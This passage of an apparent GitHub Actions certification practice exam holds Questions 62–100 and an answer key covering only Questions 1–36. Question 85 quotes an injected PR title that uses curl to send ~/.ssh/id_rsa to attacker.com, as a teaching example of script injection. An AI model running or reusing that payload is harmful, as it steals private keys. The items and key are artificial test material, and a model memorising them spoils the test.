**Answer Type**: one
**Topic**: Triggering a workflow via API

**Question**:
Which GitHub REST API endpoint is used to manually trigger a `workflow_dispatch` event for a specific workflow?

- A) `POST /repos/{owner}/{repo}/actions/workflows/{workflow_id}/runs`
- B) `POST /repos/{owner}/{repo}/actions/workflows/{workflow_id}/dispatches`
- C) `PUT /repos/{owner}/{repo}/actions/runs/{run_id}/trigger`
- D) `POST /repos/{owner}/{repo}/events`

---

### Question 62 — Workflows REST API

**Difficulty**: Medium
**Answer Type**: one
**Topic**: Listing workflow runs with filtering

**Scenario**:
An automation script needs to find all failed workflow runs for the `deploy.yml` workflow over the past 7 days to generate a failure report.

**Question**:
Which query parameters are needed when calling `GET /repos/{owner}/{repo}/actions/workflows/{workflow_id}/runs`?

- A) `?status=failure` only
- B) `?status=failure&created=>YYYY-MM-DDTHH:MM:SSZ` (using ISO 8601 date filter)
- C) `?result=failed&days=7`
- D) `?filter=failed&since=7d`

---

### Question 63 — Workflows REST API

**Difficulty**: Medium
**Answer Type**: one
**Topic**: Re-running failed jobs via API

**Scenario**:
A workflow run with 10 matrix jobs completed but 2 jobs failed due to a flaky network issue. You want to re-run only the failed jobs without re-running the 8 successful ones.

**Question**:
Which API call accomplishes this?

- A) `POST /repos/{owner}/{repo}/actions/runs/{run_id}/rerun`
- B) `POST /repos/{owner}/{repo}/actions/runs/{run_id}/rerun-failed-jobs`
- C) `PATCH /repos/{owner}/{repo}/actions/runs/{run_id}/jobs?status=failure`
- D) `POST /repos/{owner}/{repo}/actions/jobs/{job_id}/rerun` for each failed job individually

---

### Question 64 — Workflows REST API

**Difficulty**: Hard
**Answer Type**: many
**Topic**: API authentication and rate limits

**Scenario**:
A monitoring dashboard makes frequent REST API calls to list workflow runs across 50 repositories. The dashboard starts receiving 403 responses after several minutes.

**(Select all that apply)**
Which approaches help resolve or prevent API rate limit issues?

- A) Authenticate requests with a GitHub token (`Authorization: Bearer <token>`) instead of unauthenticated calls; authenticated requests have higher rate limits
- B) Cache API responses and use `ETag` / `If-None-Match` headers for conditional requests
- C) Use the `X-RateLimit-Remaining` response header to track remaining quota and back off proactively
- D) Switch to the GraphQL API for all requests to avoid rate limits entirely

---

### Question 65 — Workflows REST API

**Difficulty**: Hard
**Answer Type**: one
**Topic**: Workflow run deletion and retention management

**Scenario**:
Your organization retains workflow run logs for 90 days, but disk quotas are tight and you want to delete logs for runs older than 30 days for a specific workflow using automation.

**Question**:
Which sequence of API calls achieves this?

- A) `GET /repos/{owner}/{repo}/actions/runs?created=<30_days_ago` → `DELETE /repos/{owner}/{repo}/actions/runs/{run_id}` for each result
- B) `GET /repos/{owner}/{repo}/actions/workflows/{id}/runs?created=<30_days_ago` → `DELETE /repos/{owner}/{repo}/actions/runs/{run_id}/logs` for each
- C) `GET /repos/{owner}/{repo}/actions/runs?per_page=100` →  filter client-side by `created_at` → `DELETE /repos/{owner}/{repo}/actions/runs/{run_id}` for matching runs
- D) Use `POST /repos/{owner}/{repo}/actions/runs/bulk-delete` with a date filter body

---

### Question 66 — Reviewing Deployments

**Difficulty**: Easy
**Answer Type**: one
**Topic**: Deployment review workflow

**Question**:
When a workflow job referencing a protected environment pauses for review, which users can approve or reject the deployment?

- A) Any repository contributor with write access
- B) Only the repository owner
- C) Only the users or teams designated as required reviewers for that environment
- D) Any organization member with a `member` role or higher

---

### Question 67 — Reviewing Deployments

**Difficulty**: Medium
**Answer Type**: one
**Topic**: Deployment review and context visibility

**Scenario**:
A reviewer receives a deployment approval request. Before approving, they want to examine the code changes and test results that triggered the deployment.

**Question**:
What information is available to the reviewer on the deployment review page?

- A) Only the workflow YAML file; code changes require separate review in the PR
- B) The job execution logs up to the pause point, along with a link to the triggering commit or pull request
- C) A full diff of all code changes since the last approved deployment, rendered inline
- D) Only the workflow run ID and start time; all other information requires API calls

---

### Question 68 — Reviewing Deployments

**Difficulty**: Hard
**Answer Type**: many
**Topic**: Deployment review automation and monitoring

**Scenario**:
Your team wants to automate deployment monitoring: after approval the deployment should notify a Slack channel, and if the deployment health check fails, automatically open a GitHub issue.

**(Select all that apply)**
Which workflow patterns implement these requirements?

- A) Add a step after the deployment step that calls the Slack API with the deployment URL from the `environment.url` output
- B) Use `workflow_run` trigger to detect when the deployment workflow completes and then call the Slack API
- C) Add a health-check step after deployment with `if: failure()` that calls `gh issue create` to open an issue on failure
- D) Configure a required reviewer `webhook` in the environment settings to send Slack notifications automatically

---

### Question 69 — Creating and Publishing Actions

**Difficulty**: Easy
**Answer Type**: one
**Topic**: Action types

**Question**:
Which three types of custom GitHub Actions can be authored?

- A) Shell, Python, and Ruby actions
- B) JavaScript, Docker container, and composite actions
- C) Hosted, self-hosted, and reusable actions
- D) Inline, external, and marketplace actions

---

### Question 70 — Creating and Publishing Actions

**Difficulty**: Medium
**Answer Type**: one
**Topic**: action.yml metadata

**Scenario**:
You are creating a custom JavaScript action that accepts two required inputs (`environment` and `version`) and produces one output (`deployment-url`). You need to write the `action.yml` metadata file.

**Question**:
Which `runs:` configuration is correct for a JavaScript action targeting Node.js 20?

- A) `runs: using: "docker" image: "node:20"`
- B) `runs: using: "node20" main: "index.js"`
- C) `runs: using: "composite" steps: []`
- D) `runs: using: "javascript" runtime: "node20" entry: "index.js"`

---

### Question 71 — Creating and Publishing Actions

**Difficulty**: Medium
**Answer Type**: one
**Topic**: Composite actions

**Scenario**:
You want to create an action that runs three shell commands in sequence, wrapping them in a single reusable unit. You do not need a Docker container or Node.js.

**Question**:
Which action type is best suited for this, and what is the required `runs.using` value?

- A) JavaScript action with `using: "node20"`
- B) Composite action with `using: "composite"`
- C) Docker action with `using: "docker"`
- D) Shell action with `using: "shell"`

---

### Question 72 — Creating and Publishing Actions

**Difficulty**: Hard
**Answer Type**: many
**Topic**: Marketplace publishing and versioning

**Scenario**:
You have created a public action and want to publish it to the GitHub Marketplace. You also want consumers to be able to reference it with `@v2` semantically while still being able to pin to a specific SHA.

**(Select all that apply)**
Which steps are required for correct versioning and marketplace publishing?

- A) Create an `action.yml` at the repository root with a `name` and `description`
- B) Tag a release commit with a semantic version tag (e.g., `v2.0.0`) and optionally move the `v2` float tag to that commit
- C) Submit the action to GitHub's marketplace review queue from Repository Settings → Marketplace
- D) The repository must be public; private repositories cannot publish actions to the marketplace

---

### Question 73 — Managing Runners

**Difficulty**: Easy
**Answer Type**: one
**Topic**: Hosted runner selection

**Question**:
Which `runs-on` label targets the latest stable GitHub-hosted Ubuntu runner?

- A) `runs-on: ubuntu`
- B) `runs-on: ubuntu-latest`
- C) `runs-on: github-ubuntu`
- D) `runs-on: hosted-ubuntu`

---

### Question 74 — Managing Runners

**Difficulty**: Medium
**Answer Type**: one
**Topic**: Self-hosted runner labels

**Scenario**:
Your organization has a pool of self-hosted runners with GPU hardware. Some are Linux-based and some are Windows-based. You need a job that runs specifically on a Linux GPU runner.

**Question**:
How do you target only the Linux GPU self-hosted runners?

- A) Set `runs-on: self-hosted` and GitHub automatically selects the best available machine
- B) Apply custom labels (e.g., `gpu`, `linux`) to the runners and specify `runs-on: [self-hosted, linux, gpu]`
- C) Define a runner group named `linux-gpu` and set `runs-on: linux-gpu`
- D) Use `runs-on: self-hosted-linux` and GitHub filters by OS automatically

---

### Question 75 — Managing Runners

**Difficulty**: Medium
**Answer Type**: one
**Topic**: Self-hosted runner security considerations

**Scenario**:
Your organization is considering using self-hosted runners for public repositories to reduce costs.

**Question**:
What is the primary security risk of using self-hosted runners with public repositories?

- A) Self-hosted runners cannot access GitHub secrets, reducing their utility for public repos
- B) Anyone who forks the repository and opens a pull request can trigger workflows that execute code on your self-hosted runner
- C) GitHub charges additional fees when self-hosted runners are used with public repositories
- D) Self-hosted runners cannot use `actions/checkout` with public repositories

---

### Question 76 — Managing Runners

**Difficulty**: Hard
**Answer Type**: many
**Topic**: Runner scaling and maintenance

**Scenario**:
Your organization has 200 repositories all sharing a pool of 10 self-hosted runners. Build queues are growing. You need to scale and manage the runners effectively.

**(Select all that apply)**
Which approaches improve runner capacity and management?

- A) Use ephemeral self-hosted runners (created and destroyed per job) to eliminate runner state contamination and simplify scaling
- B) Configure runner groups in the organization to assign specific runner pools to specific teams or repositories
- C) Enable `max-parallel: 10` in every workflow to limit concurrency and prevent runner overload
- D) Use auto-scaling infrastructure (e.g., AWS Auto Scaling Group, Kubernetes operators) that provisions new runner instances on demand

---

### Question 77 — GitHub Actions Enterprise

**Difficulty**: Easy
**Answer Type**: one
**Topic**: Organization-level action policies

**Question**:
An enterprise admin wants to prevent all repositories in an organization from using GitHub Actions from third-party publishers, allowing only actions from `actions/*` and `github/*`. Which policy setting accomplishes this?

- A) Disable GitHub Actions entirely for the organization
- B) Set the policy to "Allow select actions" and configure an allow-list with `actions/*` and `github/*` patterns
- C) Enable "Require signed actions" to reject unsigned third-party actions
- D) Configure a required workflow that validates the `uses:` fields in all workflow files

---

### Question 78 — GitHub Actions Enterprise

**Difficulty**: Medium
**Answer Type**: one
**Topic**: Secrets hierarchy

**Scenario**:
Your organization has a secret named `API_KEY` defined at three levels: organization, repository, and environment (production). A workflow job references the `production` environment and accesses `secrets.API_KEY`.

**Question**:
Which secret value does the job receive?

- A) The organization-level secret, as organization secrets have highest precedence
- B) The repository-level secret, as it overrides the organization secret
- C) The environment-level secret, as environment secrets have the highest precedence when a job references that environment
- D) All three values are merged; the job receives a comma-separated list

---

### Question 79 — GitHub Actions Enterprise

**Difficulty**: Medium
**Answer Type**: many
**Topic**: Runner groups and access control

**Scenario**:
An enterprise has several security-sensitive teams that need dedicated self-hosted runners, isolated from general development runners.

**(Select all that apply)**
Which runner group configurations support this isolation?

- A) Create a runner group named `security-team` and add the dedicated runners to it
- B) Restrict the runner group to only the repositories or organizations belonging to the security team
- C) Set `runs-on: [self-hosted, security-team]` in the workflow to route jobs to the correct group
- D) Enable "Required reviewers" on the runner group so security team approves each job

---

### Question 80 — GitHub Actions Enterprise

**Difficulty**: Hard
**Answer Type**: one
**Topic**: Required workflows at enterprise level

**Scenario**:
An enterprise security admin wants every repository in two specific organizations to automatically run a compliance scan workflow on every push, regardless of what the repository's workflow files contain.

**Question**:
Which feature enables this enforcement?

- A) Branch protection rules with a required status check pointing to the compliance workflow
- B) Organization-level required workflows configured in Enterprise Settings → Policies → Required workflows, targeting the two organizations
- C) A `repository_dispatch` event listener in every repository that triggers the compliance scan
- D) An enterprise-wide `CODEOWNERS` file that adds the security team as required reviewers for all workflow file changes

---

### Question 81 — GitHub Actions Enterprise

**Difficulty**: Hard
**Answer Type**: many
**Topic**: Audit logging for GitHub Actions

**Scenario**:
A compliance team needs to audit all GitHub Actions activity including who triggered workflows, which secrets were accessed, and any changes to workflow configurations.

**(Select all that apply)**
Which audit log event categories are relevant for GitHub Actions compliance auditing?

- A) `workflow_run` events — record when workflows are triggered, completed, or cancelled
- B) `secret` events — record when secrets are created, updated, deleted, or accessed by workflows
- C) `org.runner` events — record runner registration, removal, and group membership changes
- D) `workflow` events — record changes to workflow files and permission configuration

---

### Question 82 — Security and Optimization

**Difficulty**: Easy
**Answer Type**: one
**Topic**: GITHUB_TOKEN lifecycle

**Question**:
Which statement accurately describes the lifecycle of `GITHUB_TOKEN`?

- A) It is created at the start of the workflow run and persists until the workflow is manually deleted
- B) It is created at the start of each job and automatically revoked when that job completes
- C) It is created once per repository and rotated every 24 hours
- D) It is a long-lived token that the repository owner must manually regenerate when it expires

---

### Question 83 — Security and Optimization

**Difficulty**: Medium
**Answer Type**: one
**Topic**: OIDC for cloud provider federation

**Scenario**:
Your organization currently stores AWS credentials as GitHub secrets to deploy from Actions workflows. Your security team wants to eliminate long-lived credentials.

**Question**:
Which approach replaces long-lived AWS credentials with short-lived tokens?

- A) Rotate the AWS credentials stored in GitHub secrets every 24 hours using a scheduled workflow
- B) Configure AWS IAM to trust GitHub's OIDC provider and use `aws-actions/configure-aws-credentials` with OIDC to obtain short-lived session tokens
- C) Store credentials in GitHub environment secrets rather than repository secrets to reduce their blast radius
- D) Use `GITHUB_TOKEN` directly as the AWS authentication token, since it is short-lived

---

### Question 84 — Security and Optimization

**Difficulty**: Medium
**Answer Type**: one
**Topic**: SHA pinning for actions

**Scenario**:
Your security audit flags that all third-party actions in your workflows are pinned to major version tags like `@v3`. The audit recommends pinning to full commit SHAs instead.

**Question**:
What security property does SHA pinning provide that major-version tag pinning does not?

- A) SHA pinning prevents the action from making network calls during execution
- B) SHA pinning ensures the exact code at that commit is used; a tag can be force-moved to a different, potentially malicious commit
- C) SHA pinning reduces workflow execution time because GitHub caches SHA-pinned actions more aggressively
- D) SHA pinning restricts the action to read-only permissions automatically

---

### Question 85 — Security and Optimization

**Difficulty**: Hard
**Answer Type**: one
**Topic**: Script injection prevention

**Scenario**:
A workflow step processes user-controlled PR titles:

```yaml
- name: Print PR title
  run: echo "Processing PR: ${{ github.event.pull_request.title }}"
```

An attacker creates a PR titled: `` valid title"; curl https://attacker.com/?d=$(cat ~/.ssh/id_rsa); echo " ``

**Question**:
Which mitigation correctly prevents script injection without disabling the step?

- A) Wrap the expression in single quotes: `echo 'PR: ${{ github.event.pull_request.title }}'`
- B) Use `${{ toJson(github.event.pull_request.title) }}` to JSON-encode the value inline
- C) Set the title as an environment variable and reference it as `$PR_TITLE` in the shell command
- D) Add `permissions: read-all` to the job to restrict token scope

---

### Question 86 — Security and Optimization

**Difficulty**: Hard
**Answer Type**: many
**Topic**: OIDC subject claims and fine-grained trust

**Scenario**:
Your organization uses OIDC to allow GitHub Actions workflows to assume an AWS IAM role. You want to restrict trust so only workflows running from the `production` environment in the `acme-corp/api` repository can assume the role.

**(Select all that apply)**
Which OIDC subject claim components should be included in the IAM trust policy condition?

- A) `repo:acme-corp/api` — identifies the specific repository
- B) `environment:production` — identifies the GitHub environment
- C) `ref:refs/heads/main` — could also be included to restrict to the main branch
- D) `actor:deploy-bot` — restricts to a specific user or bot account that triggered the workflow

---

### Question 87 — Security and Optimization

**Difficulty**: Hard
**Answer Type**: one
**Topic**: Least-privilege GITHUB_TOKEN design

**Scenario**:
A workflow needs to: (1) read repository contents, (2) comment on pull requests, and (3) push to GitHub Packages. No other permissions should be granted.

**Question**:
Which `permissions` block correctly implements least privilege for this workflow?

```yaml
permissions:
  # ???
```

- A) `permissions: write-all`
- B) `contents: read` / `pull-requests: write` / `packages: write`
- C) `contents: write` / `pull-requests: read` / `packages: write`
- D) `contents: read` / `issues: write` / `packages: write`

---

### Question 88 — Security and Optimization

**Difficulty**: Hard
**Answer Type**: many
**Topic**: Supply chain security

**Scenario**:
Your security team wants to harden the GitHub Actions supply chain for all workflows in the organization.

**(Select all that apply)**
Which practices constitute effective supply chain hardening for GitHub Actions?

- A) Pin all third-party actions to a full commit SHA instead of a mutable tag
- B) Use GitHub's Dependency Review Action to detect vulnerable actions on pull requests
- C) Allow only actions from verified creators (GitHub-verified organizations) by configuring the org-level action allow-list
- D) Enable Dependabot for GitHub Actions to receive automated PRs when pinned SHA versions have newer releases

---

### Question 89 — Common Failures & Troubleshooting

**Difficulty**: Easy
**Answer Type**: one
**Topic**: Authentication error diagnosis

**Question**:
A workflow step fails with `fatal: could not read Username for 'https://github.com': No such device or address`. What is the most likely cause?

- A) The runner does not have network access to GitHub
- B) The `actions/checkout` step is missing or the `GITHUB_TOKEN` does not have sufficient `contents: read` permission
- C) The workflow is triggered by a fork, which disables all GitHub tokens
- D) The repository name contains special characters that the Git client cannot parse

---

### Question 90 — Common Failures & Troubleshooting

**Difficulty**: Medium
**Answer Type**: one
**Topic**: Dependency installation failures

**Scenario**:
A workflow runs `npm ci` and fails with `npm ERR! code ERESOLVE`. The same command succeeds locally. Investigation shows the runner uses a different Node.js version than the developer's machine.

**Question**:
Which workflow change most directly resolves this?

- A) Replace `npm ci` with `npm install --force` to bypass peer dependency checking
- B) Add `actions/setup-node` before the install step and pin the exact same Node.js version used locally
- C) Add `NODE_OPTIONS=--legacy-peer-deps` to the workflow-level `env:` block
- D) Use `runs-on: self-hosted` so the runner has the same environment as the developer's machine

---

### Question 91 — Common Failures & Troubleshooting

**Difficulty**: Medium
**Answer Type**: one
**Topic**: Workflow timeout failures

**Scenario**:
A long-running build job is being cancelled after 6 hours. The default job timeout is 6 hours. The build legitimately requires more time.

**Question**:
Which configuration change extends the job timeout?

- A) Set `continue-on-error: true` on the slow step to prevent cancellation
- B) Add `timeout-minutes: 720` to the job definition (up to the maximum allowed)
- C) Split the job into two jobs and chain them with `needs:` to bypass the per-job limit
- D) Set `ACTIONS_JOB_TIMEOUT=720` as a workflow-level environment variable

---

### Question 92 — Common Failures & Troubleshooting

**Difficulty**: Hard
**Answer Type**: many
**Topic**: Matrix job failure diagnosis

**Scenario**:
A matrix workflow runs across 4 OSes and 3 language versions (12 total jobs). Two jobs fail. With `fail-fast: true` (the default), several other jobs are cancelled before completing.

**(Select all that apply)**
Which steps help diagnose and recover from this situation?

- A) Set `fail-fast: false` in the strategy block and re-run to let all matrix jobs complete, revealing the full failure scope
- B) Use the "Re-run failed jobs" option in the GitHub UI to re-run only the 2 failed jobs without re-running the 10 successful ones
- C) Set `continue-on-error: true` on each step to prevent any job from being marked failed
- D) Examine the failed job's logs and expand the specific step that produced the failure message

---

### Question 93 — Common Failures & Troubleshooting

**Difficulty**: Hard
**Answer Type**: one
**Topic**: Secret masking limitations

**Scenario**:
A workflow step accidentally formats a secret value into a structured string like `{"token": "abc123secret"}` and outputs the entire JSON. The developer expects GitHub to mask `abc123secret`, but the full JSON is visible in the logs.

**Question**:
Which statement correctly explains this behavior?

- A) Secrets are masked only for `secrets.*` context references, not for variables derived from secrets
- B) GitHub masks exact string literals that match stored secret values, but if the secret is embedded inside a larger string and the exact value is unique enough, it may still be masked; however, transformations like JSON encoding can prevent masking
- C) Secret masking is disabled for self-hosted runners for performance reasons
- D) The `GITHUB_TOKEN` is always masked; only custom secrets are subject to the masking algorithm

---

### Question 94 — Contextual Information (Cross-Topic)

**Difficulty**: Medium
**Answer Type**: one
**Topic**: Cross-topic: contexts + trigger events

**Scenario**:
A workflow is triggered by both `push` and `pull_request` events. A step needs to output the target branch — `main` for a push to main, or the base branch of the pull request.

**Question**:
Which expression correctly retrieves the base/target branch for both trigger types?

- A) `${{ github.base_ref }}` — works for both `push` and `pull_request`
- B) `${{ github.ref_name }}` — returns the branch name for push; use `github.base_ref` for pull_request, requiring conditional logic
- C) `${{ github.head_ref }}` — contains the target branch for both event types
- D) `${{ env.GITHUB_BASE_REF }}` — this variable is set by GitHub for all trigger types

---

### Question 95 — Security + Workflow Structure (Cross-Topic)

**Difficulty**: Hard
**Answer Type**: many
**Topic**: Cross-topic: security + workflow structure

**Scenario**:
You are designing a deployment workflow that must: run only on merge to `main`, require two approvers, use OIDC for AWS access with no long-lived credentials, and pin all actions to SHAs.

**(Select all that apply)**
Which configuration elements implement all four requirements?

- A) `on: push: branches: [main]` as the trigger
- B) A `production` environment with 2 required reviewers configured
- C) `permissions: id-token: write` at the job level and use of `aws-actions/configure-aws-credentials` with `role-to-assume`
- D) All `uses:` references pinned to 40-character commit SHAs (e.g., `actions/checkout@<SHA>`)

---

### Question 96 — Caching + Artifacts (Cross-Topic)

**Difficulty**: Medium
**Answer Type**: one
**Topic**: Cross-topic: cache vs artifact — correct tool selection

**Scenario**:
Your build job produces a compiled binary that must be deployed by a downstream job. The binary should be preserved as a downloadable file attached to the workflow run for 30 days, not just used within the run.

**Question**:
Which tool is correct for this use case?

- A) `actions/cache` — caches the binary for reuse in future runs and stores it in the run summary
- B) `actions/upload-artifact` with `retention-days: 30` — uploads the file as a run artifact accessible from the UI and API
- C) `GITHUB_OUTPUT` — outputs the binary path so the deploy job can reference it directly
- D) Both `actions/cache` and `actions/upload-artifact` provide identical functionality; choose either

---

### Question 97 — Enterprise + Security (Cross-Topic)

**Difficulty**: Hard
**Answer Type**: one
**Topic**: Cross-topic: enterprise policy + OIDC

**Scenario**:
An enterprise admin notices that a repository is using OIDC to assume an AWS role with a very broad trust policy (`"StringLike": {"token.actions.githubusercontent.com:sub": "repo:acme-corp/*"}`), allowing any workflow in any `acme-corp` repository to assume the role.

**Question**:
Which change to the trust policy correctly tightens the restriction to only workflows running in the `production` environment of `acme-corp/api`?

- A) Change the condition to `"StringEquals": {"token.actions.githubusercontent.com:sub": "repo:acme-corp/api:environment:production"}`
- B) Change the condition to `"StringLike": {"token.actions.githubusercontent.com:aud": "acme-corp/api"}`
- C) Add a separate IAM policy that checks `github.repository == 'acme-corp/api'`
- D) Restrict GitHub Actions organization policy to only allow OIDC in `acme-corp/api`

---

### Question 98 — Reusable Workflows + Security (Cross-Topic)

**Difficulty**: Hard
**Answer Type**: many
**Topic**: Cross-topic: reusable workflow security

**Scenario**:
Your organization maintains a shared reusable workflow for deployments. Multiple teams consume it. You want to ensure: (1) the calling workflow cannot override the deployment target environment, (2) secrets used in the reusable workflow are not leaked to callers, and (3) the reusable workflow always runs the latest approved version.

**(Select all that apply)**
Which design decisions support all three goals?

- A) Hardcode the environment name inside the reusable workflow rather than accepting it as an input
- B) Define secrets in the reusable workflow using `on.workflow_call.secrets` with `required: true` so callers explicitly pass them rather than receiving them automatically
- C) Reference the reusable workflow at a specific tagged release or SHA (`@v2` or `@abc123`) rather than `@main` in calling workflows
- D) Use `secrets: inherit` in all calling workflows to simplify secret passing

---

### Question 99 — Troubleshooting + Debugging (Cross-Topic)

**Difficulty**: Hard
**Answer Type**: one
**Topic**: Cross-topic: troubleshooting + artifacts + matrix

**Scenario**:
A matrix workflow across 6 OS/version combinations generates test reports. Two jobs fail. You want to download only the test reports from the failed jobs without re-downloading reports from successful jobs.

**Question**:
Which approach is most efficient?

- A) Download all artifacts from the run using `actions/download-artifact` with no name filter and then manually filter files by OS/version folder
- B) Upload artifacts with unique names per matrix combination (e.g., `test-report-ubuntu-18`) so failed job reports can be downloaded individually by name
- C) Use `if: failure()` on the upload step so only failed jobs upload their artifacts, then download all artifacts from the run
- D) Use the REST API `GET /repos/{owner}/{repo}/actions/runs/{run_id}/artifacts` filtered by artifact name prefix to selectively retrieve only the failed job reports

---

### Question 100 — Workflow Sharing + REST API (Cross-Topic)

**Difficulty**: Medium
**Answer Type**: one
**Topic**: Cross-topic: reusable workflow + REST API trigger

**Scenario**:
Your team has a reusable deployment workflow in `acme-corp/shared-workflows`. You want an external CD tool to trigger this workflow for a specific service repository via the API. The workflow accepts an `environment` input.

**Question**:
What is the correct approach to trigger the workflow with an input via the API?

- A) Call `POST /repos/acme-corp/shared-workflows/actions/workflows/deploy.yml/dispatches` with `inputs.environment` in the request body, since `workflow_dispatch` inputs are supported via API
- B) Call `POST /repos/acme-corp/service-repo/actions/workflows/deploy.yml/dispatches` — the service repo must have its own `workflow_dispatch` workflow that calls the reusable one, passing `environment` as a `with` input
- C) Call `POST /repos/acme-corp/shared-workflows/actions/workflows/deploy.yml/runs` using the `workflow_call` API endpoint with input parameters
- D) Use `repository_dispatch` on the shared-workflows repository with a custom event type and pass `environment` in the `client_payload`

---

## Answer Key

| Q# | Answer(s) | Explanation | Source | Difficulty |
|----|-----------|-------------|--------|------------|
| 1 | B | The extension provides YAML schema validation, IntelliSense, and syntax highlighting. It does not run workflows locally or deploy files. | 01-GitHub-Actions-VS-Code-Extension.md | Easy |
| 2 | B | Typing `${{` triggers context autocompletion for available expressions. The extension does not execute expressions against live runs. | 01-GitHub-Actions-VS-Code-Extension.md | Easy |
| 3 | B | The extension validates YAML structure and workflow syntax in real time with inline error highlighting — no run is needed. | 01-GitHub-Actions-VS-Code-Extension.md | Medium |
| 4 | B | Hovering over an action reference in VS Code shows its `action.yml` metadata including inputs and outputs. | 01-GitHub-Actions-VS-Code-Extension.md | Medium |
| 5 | B | The `github` context contains workflow run metadata: run ID, SHA, ref, repository, actor, etc. Runner OS is in `runner`; matrix is in `strategy`/`matrix`. | 02-Contextual-Information.md | Easy |
| 6 | C | `runner.os` exposes the runner's operating system. `github.runner_os` does not exist; `RUNNER_OS` is a default environment variable, not a context. | 02-Contextual-Information.md | Easy |
| 7 | C | `needs.<job_id>.outputs.<output_name>` is the correct expression to access outputs from a dependent job. | 02-Contextual-Information.md | Medium |
| 8 | A, B, D | `secrets` context is available in `steps[*].env`, `steps[*].with`, and `steps[*].run`. It is NOT available in `strategy.matrix`. | 02-Contextual-Information.md | Medium |
| 9 | C | `matrix.<property>` is the correct expression. `github.matrix` and `strategy.matrix` are not valid context paths for accessing individual matrix values. | 02-Contextual-Information.md | Medium |
| 10 | A, D | `needs.lint.result == 'failure'` and `needs.lint.result != 'success'` are both valid. `failure()` at the job `if` level checks the job's own prior steps, not other jobs. `job.status` is not available at job `if` evaluation time. | 02-Contextual-Information.md | Hard |
| 11 | B | The `run-name` key only has access to `github`, `inputs`, and `vars` contexts — not `secrets`, `env`, `runner`, or `job`. | 03-Context-Availability-Reference.md | Easy |
| 12 | C | `jobs.<job_id>.if` is evaluated statically before a runner is assigned, so the `runner` context (which is a runtime context) is not available there. | 03-Context-Availability-Reference.md | Medium |
| 13 | C | `secrets` is not in the list of available contexts for `jobs.<job_id>.runs-on`. Only `github`, `inputs`, and `vars` are available there. | 03-Context-Availability-Reference.md | Medium |
| 14 | A, C | A: `secrets` is valid in `steps[*].env`. C: `needs` context is valid in `steps[*].run`. B is wrong: `runner` is not available in `runs-on`. D is wrong: `matrix` is not available inside `strategy.matrix` itself. | 03-Context-Availability-Reference.md | Hard |
| 15 | B | Interpolating a secret directly into a `run:` command embeds it into the shell command string. Even if GitHub masks the literal, the value is part of the command and can be exposed in process listings, error logs, or child process arguments. | 03-Context-Availability-Reference.md | Hard |
| 16 | B | Workflow files must be placed in the `.github/workflows/` directory with a `.yml` or `.yaml` extension. | 04-Workflow-File-Structure.md | Easy |
| 17 | B | Jobs run on separate runners and can execute in parallel (unless dependencies are set); steps within a job run sequentially on the same runner. | 04-Workflow-File-Structure.md | Easy |
| 18 | B | Adding `permissions: contents: write` grants the `GITHUB_TOKEN` the write access needed to push tags. A does not change permissions; C works but is not the minimal approach; D is not a valid key. | 04-Workflow-File-Structure.md | Medium |
| 19 | A, B, C | YAML anchors (`&`), aliases (`*`), and merge keys (`<<:`) are all standard YAML features supported in single workflow files. `$include` is not a YAML directive. | 04-Workflow-File-Structure.md | Medium |
| 20 | B | `jobs.<job_id>.services` is designed to run sidecar containers (e.g., databases) that GitHub starts before job steps. A separate job, `docker run`, or `needs:` dependencies are less appropriate or incorrect for this pattern. | 04-Workflow-File-Structure.md | Medium |
| 21 | B | The base matrix produces 2 × 3 = 6 combinations. The `include` entry matches an existing combination (ubuntu-latest + node 18) and adds the `experimental: true` property to it rather than creating a new job. | 04-Workflow-File-Structure.md | Hard |
| 22 | A, B | `fail-fast: false` prevents cancellation of remaining jobs on failure; `max-parallel: 4` limits concurrency to 4. `continue-on-error: true` suppresses step failures but does not prevent job cancellation. D contradicts itself by combining `fail-fast: true` (cancels others on failure) with the goal of no cancellation. | 04-Workflow-File-Structure.md | Hard |
| 23 | C | `on: schedule` with a `cron:` expression is the correct trigger for time-based scheduling. `on: cron` and `on: timer` are not valid GitHub Actions trigger names. | 05-Workflow-Trigger-Events.md | Easy |
| 24 | C | `workflow_dispatch` enables manual workflow triggering from the UI or REST API with optional typed inputs. `repository_dispatch` is for external systems without UI; `workflow_call` is for reusable workflows. | 05-Workflow-Trigger-Events.md | Easy |
| 25 | B | `on: pull_request: branches: [main]` triggers on PR events (opened, synchronize, reopened) targeting `main`. `push` triggers on direct commits; `pull_request_review` triggers on review actions, not PR updates. | 05-Workflow-Trigger-Events.md | Medium |
| 26 | B | The `paths:` filter under `push:` restricts the trigger to specific file paths. `branches:` filters branches, not files. `files:` and `filter: paths:` are not valid keys. | 05-Workflow-Trigger-Events.md | Medium |
| 27 | C | `repository_dispatch` accepts a custom event type sent via `POST /repos/{owner}/{repo}/dispatches` from any HTTP client, making it the correct choice for external system integration. `workflow_dispatch` can be API-triggered but is designed for manual/human initiation with typed inputs. | 05-Workflow-Trigger-Events.md | Medium |
| 28 | B | The `schedule` event does not deliver an event payload; `github.event` is empty (or contains minimal scheduling metadata). Scheduled runs do not carry commit payloads. | 05-Workflow-Trigger-Events.md | Hard |
| 29 | A, B | A correctly configures push with branch and path filters; B correctly configures pull_request with branch and type filters. C (`paths-ignore`) is not required and would change the push trigger's behavior. D (schedule) is unrelated to the requirements. | 05-Workflow-Trigger-Events.md | Hard |
| 30 | B | Custom `env:` blocks can be defined at the workflow level (top-level `env:`), job level (`jobs.<job_id>.env:`), and step level (`jobs.<job_id>.steps[*].env:`). | 06-Custom-Environment-Variables.md | Easy |
| 31 | D | Both B and C are correct for different access patterns. `GITHUB_ENV` sets environment variables available in subsequent steps; `GITHUB_OUTPUT` sets step outputs accessed via `steps.<id>.outputs.*`. The question asks which is correct, and both approaches are valid but for different consumers. | 06-Custom-Environment-Variables.md | Medium |
| 32 | C | Step-level `env:` values override job-level, which override workflow-level for that step's execution context. | 06-Custom-Environment-Variables.md | Medium |
| 33 | B | If the API response contains a newline character followed by a variable assignment, it can inject additional environment variables into `GITHUB_ENV`. This is a known environment file injection vulnerability. | 06-Custom-Environment-Variables.md | Hard |
| 34 | A, B, D | All three append Markdown-formatted content to `$GITHUB_STEP_SUMMARY`, which renders in the GitHub UI. C writes to `GITHUB_OUTPUT`, which is for step outputs, not UI summaries. | 06-Custom-Environment-Variables.md | Medium |
| 35 | C | `GITHUB_SHA` contains the full commit SHA. `GITHUB_REF` is the branch/tag ref. `GITHUB_HEAD_SHA` is used in some PR contexts but is not a standard default variable. | 07-Default-Environment-Variables.md | Easy |
| 36 | B | GitHub automatically sets `CI=true` in all workflow runs. This is a de facto standard used by many tools to detect CI environments. | 07-Default-Environment-Variables.md | Easy |
